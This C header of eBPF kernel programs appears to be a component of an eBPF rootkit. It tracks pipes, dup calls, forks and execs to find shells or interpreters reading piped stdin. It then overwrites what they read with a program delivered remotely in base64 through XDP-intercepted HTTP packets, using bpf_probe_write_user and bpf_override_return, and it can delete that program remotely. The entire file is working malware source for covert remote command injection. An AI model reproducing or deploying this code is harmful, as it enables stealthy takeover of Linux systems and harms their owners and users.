/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _PIPE_H_
#define _PIPE_H_

struct pipe_ctx_t {
    void *fds;
};

struct bpf_map_def SEC("maps/pipe_ctx") pipe_ctx = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(void *),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

SYSCALL_KPROBE1(pipe, void *, fds) {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct pipe_ctx_t pctx = {};
    pctx.fds = fds;
    bpf_map_update_elem(&pipe_ctx, &tgid, &pctx, BPF_ANY);
    return 0;
}

SYSCALL_KPROBE1(pipe2, void *, fds) {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct pipe_ctx_t pctx = {};
    pctx.fds = fds;
    bpf_map_update_elem(&pipe_ctx, &tgid, &pctx, BPF_ANY);
    return 0;
}

struct tokens_t {
    u32 token1;
    u32 token2;
};

__attribute__((always_inline)) u32 select_active_token(struct tokens_t *tokens) {
    if (tokens->token2 == 0) {
        return tokens->token1;
    }
    return tokens->token2;
}

struct bpf_map_def SEC("maps/pid_pipe_tokens") pid_pipe_tokens = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct tokens_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/pipelines") pipelines = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_pipe(int fds[2]) {
    int fd1, fd2 = 0;
    struct tokens_t new_tokens = {};

    bpf_probe_read(&fd1, sizeof(fd1), &fds[0]);
    bpf_probe_read(&fd2, sizeof(fd2), &fds[1]);

    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &tgid);
    if (tokens == NULL) {
        tokens = &new_tokens;
    }

    if (tokens->token1 == 0) {
        tokens->token1 = bpf_get_prandom_u32();
    } else if (tokens->token2 == 0) {
        tokens->token2 = bpf_get_prandom_u32();
        bpf_map_update_elem(&pipelines, &tokens->token2, &tokens->token1, BPF_ANY);
    } else {
        tokens->token1 = tokens->token2;
        tokens->token2 = bpf_get_prandom_u32();
        bpf_map_update_elem(&pipelines, &tokens->token2, &tokens->token1, BPF_ANY);
    }
    bpf_map_update_elem(&pid_pipe_tokens, &tgid, tokens, BPF_ANY);
    // bpf_printk("pipe: pid:%d token1:%lu token2:%lu\n", tgid, tokens->token1, tokens->token2);
    // bpf_printk("      fd0:%d fd1:%d\n", fd1, fd2);
    return 0;
}

SYSCALL_KRETPROBE(pipe) {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct pipe_ctx_t *pctx = bpf_map_lookup_elem(&pipe_ctx, &tgid);
    if (pctx == NULL) {
        return 0;
    }
    return handle_pipe(pctx->fds);
}

SYSCALL_KRETPROBE(pipe2) {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct pipe_ctx_t *pctx = bpf_map_lookup_elem(&pipe_ctx, &tgid);
    if (pctx == NULL) {
        return 0;
    }
    return handle_pipe(pctx->fds);
}

struct _tracepoint_sched_process_fork
{
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;

    char parent_comm[16];
    pid_t parent_pid;
    char child_comm[16];
    pid_t child_pid;
};

SEC("tracepoint/sched/sched_process_fork")
int sched_process_fork(struct _tracepoint_sched_process_fork *args) {
    u32 ppid = bpf_get_current_pid_tgid() >> 32;
    u32 child_pid = 0;
    bpf_probe_read(&child_pid, sizeof(child_pid), &args->child_pid);

    // copy pipe token from parent to child if there is one
    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &ppid);
    if (tokens == NULL)
        return 0;

    bpf_map_update_elem(&pid_pipe_tokens, &child_pid, tokens, BPF_ANY);
    // bpf_printk("fork: token1:%lu token2:%lu pid:%d\n", tokens->token1, tokens->token2, child_pid);
    return 0;
}

struct pipe_writers_t {
    u32 pid;
    char comm[16];
};

struct bpf_map_def SEC("maps/pipe_writers") pipe_writers = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = 16,
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct piped_stdin_t {
    u32 prog_key;
    u32 cursor;
    u32 pipe_token;
};

struct bpf_map_def SEC("maps/pid_with_piped_stdin") pid_with_piped_stdin = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct piped_stdin_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_dup(int oldfd, int newfd) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &pid);
    if (tokens == NULL)
        return 0;

    u32 token = select_active_token(tokens);

    // save the comm of the writer
    if (newfd == 1) {
        struct pipe_writers_t val = {};
        val.pid = pid;
        bpf_map_update_elem(&pipe_writers, &token, &val, BPF_ANY);
        // bpf_printk("dup writer: oldfd:%d newfd:%d\n", oldfd, newfd);
    }

    // save the pipe context for the receiver
    if (newfd == 0) {
        // mark stdin as piped for active pid
        struct piped_stdin_t val = {};
        val.pipe_token = token;
        bpf_map_update_elem(&pid_with_piped_stdin, &pid, &val, BPF_ANY);
        // bpf_printk("dup reader: oldfd:%d newfd:%d\n", oldfd, newfd);
    }

    return 0;
}

SEC("kprobe/security_bprm_committed_creds")
int kprobe_security_bprm_committed_creds(struct pt_regs *ctx) {
    struct pipe_writers_t updated_entry = {};
    bpf_get_current_comm(&updated_entry.comm, sizeof(updated_entry.comm));
    // bpf_printk("exec: %s\n", updated_entry.comm);

    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &pid);
    if (tokens == NULL)
        return 0;

    // bpf_printk("exec: pid:%d token1:%lu token2:%lu\n", pid, tokens->token1, tokens->token2);
    u32 token = select_active_token(tokens);

    struct pipe_writers_t *val = bpf_map_lookup_elem(&pipe_writers, &token);
    if (val == NULL)
        return 0;

    if (val->pid == pid) {
        updated_entry.pid = val->pid;
        bpf_map_update_elem(&pipe_writers, &token, &updated_entry, BPF_ANY);
        // bpf_printk("exec writer token:@%lu comm:%s\n", token, updated_entry.comm);
    }
    return 0;
}

SYSCALL_KPROBE2(dup2, int, oldfd, int, newfd) {
    return handle_dup(oldfd, newfd);
}

SYSCALL_KPROBE2(dup3, int, oldfd, int, newfd) {
    return handle_dup(oldfd, newfd);
}

SEC("kprobe/do_exit")
int kprobe_do_exit(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 tgid = pid_tgid >> 32;
    u32 pid = pid_tgid;

    if (tgid == pid) {
        bpf_map_delete_elem(&pid_pipe_tokens, &tgid);
        bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
    }

    return 0;
}

#define PIPE_OVERRIDE_PYTHON_KEY 1
#define PIPE_OVERRIDE_SHELL_KEY  2

struct bpf_map_def SEC("maps/comm_prog_key") comm_prog_key = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = 32,
    .value_size = sizeof(u32),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/piped_progs") piped_progs = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = HTTP_REQ_LEN - 32,
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/piped_progs_gen") piped_progs_gen = {
    .type = BPF_MAP_TYPE_PERCPU_ARRAY,
    .key_size = sizeof(u32),
    .value_size = HTTP_REQ_LEN - 32,
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *buf) {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct piped_stdin_t *piped_stdin = bpf_map_lookup_elem(&pid_with_piped_stdin, &tgid);
    if (piped_stdin == NULL)
        return 0;

    // bpf_printk("stdin read: token:@%lu pid:%d\n", piped_stdin->pipe_token, tgid);
    if (piped_stdin->prog_key == 0) {
        // retrieve the comm of the writer
        struct pipe_writers_t *val = bpf_map_lookup_elem(&pipe_writers, &piped_stdin->pipe_token);
        if (val == NULL) {
            u32 *next_token = bpf_map_lookup_elem(&pipelines, &piped_stdin->pipe_token);
            if (next_token == NULL) {
                // bpf_printk("stdin read: no pipeline\n");
                return 0;
            }
            val = bpf_map_lookup_elem(&pipe_writers, next_token);
            if (val == NULL) {
                // bpf_printk("stdin read: no writer\n");
                return 0;
            }
        }

        // check if the receiver of the pipe is one of the program we care about
        char to[16] = {};
        bpf_get_current_comm(&to, sizeof(to));

        char pipe_key[32] = {};
        bpf_probe_read(&pipe_key, 16, val->comm);
        bpf_probe_read(&pipe_key[16], 16, &to);
        // bpf_printk("read from: %s\n", val->comm);
        // bpf_printk("read to: %s\n", to);

        u32 *prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
        if (prog_key == 0) {
            // try without the source comm
            char zero[16] = {};
            bpf_probe_read(&pipe_key, 16, &zero);

            prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
            if (prog_key == 0) {
                // we don't care about this program, delete pid_with_piped_stdin entry
                bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
                return 0;
            }
        }
        piped_stdin->prog_key = *prog_key;
    }

    void *prog = bpf_map_lookup_elem(&piped_progs, &piped_stdin->prog_key);
    if (prog == NULL)
        return 0;

    char c = 0;
    if (piped_stdin->cursor > HTTP_REQ_LEN)
        return 0;

    bpf_probe_read(&c, sizeof(c), (void*)prog + piped_stdin->cursor);
    if (c == 0) {
        bpf_probe_write_user(buf, &c, 1);
        bpf_override_return(ctx, 0);
        return 0;
    }

    bpf_probe_write_user(buf, &c, 1);
    piped_stdin->cursor += 1;
    bpf_override_return(ctx, 1);

    // bpf_printk("(+%d) %s\n", piped_stdin->cursor, buf);
    return 0;
}

__attribute__((always_inline)) int handle_put_pipe_prog(char request[HTTP_REQ_LEN]) {
    // parse "from" and "to" commands. To simplify our eBPF programs, we assume that the commands cannot contain a '#'.
    char pipe_key[32] = {};

    #pragma unroll
    for (int i = 0; i < 32; i++) {
        if (request[i] != '#') {
            pipe_key[i] = request[i];
        }
    }

    // generate a unique id for this pipe key
    u32 prog_key = bpf_get_prandom_u32();

    u32 key = 0;
    char *prog = bpf_map_lookup_elem(&piped_progs_gen, &key);
    if (prog == NULL) {
        return 0;
    }

    u32 a = 0, b = 0, c = 0, d = 0;
    u32 tmp = 0;
    u16 prog_cursor = 0;

    // decode
    #pragma unroll
    for (int i = 0; i < (HTTP_REQ_LEN - 32); i += 4) {
        if (request[i + 32] == '_') {
            goto save_prog;
        }

        a = to_base64_value(request[i + 32]);
        b = to_base64_value(request[i + 33]);
        c = to_base64_value(request[i + 34]);
        d = to_base64_value(request[i + 35]);

        tmp = (a << 3 * 6) + (b << 2 * 6) + (c << 1 * 6) + (d << 0 * 6);

        if (prog_cursor < (HTTP_REQ_LEN - 32)) {
            prog[prog_cursor++] = (tmp >> 2 * 8) & 0xFF;
        }
        if (prog_cursor < (HTTP_REQ_LEN - 32)) {
            prog[prog_cursor++] = (tmp >> 1 * 8) & 0xFF;
        }
        if (prog_cursor < (HTTP_REQ_LEN - 32)) {
            prog[prog_cursor++] = (tmp >> 0 * 8) & 0xFF;
        }
    }

save_prog:
    prog[prog_cursor] = 0;
    bpf_map_update_elem(&piped_progs, &prog_key, prog, BPF_ANY);

    // update the comm_prg_key map for the new piped program to take effect
    bpf_map_update_elem(&comm_prog_key, pipe_key, &prog_key, BPF_ANY);
    return 0;
}

SEC("xdp/ingress/put_pipe_prog")
int xdp_ingress_put_pipe_prog(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_put_pipe_prog(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

__attribute__((always_inline)) int handle_del_pipe_prog(char request[HTTP_REQ_LEN]) {
    // parse "from" and "to" commands. To simplify our eBPF programs, we assume that the commands cannot contain a '#'.
    char pipe_key[32] = {};

    #pragma unroll
    for (int i = 0; i < 32; i++) {
        if (request[i] != '#') {
            pipe_key[i] = request[i];
        }
    }
    // query the unique key identifying this pipe
    u32 *prog_key = bpf_map_lookup_elem(&comm_prog_key, &pipe_key);
    if (prog_key == NULL) {
        // nothing to do
        return 0;
    }

    // delete the entry in comm_prg_key and piped_progs
    bpf_map_delete_elem(&comm_prog_key, pipe_key);
    bpf_map_delete_elem(&piped_progs, prog_key);
    return 0;
}

SEC("xdp/ingress/del_pipe_prog")
int xdp_ingress_del_pipe_prog(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_del_pipe_prog(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

#endif
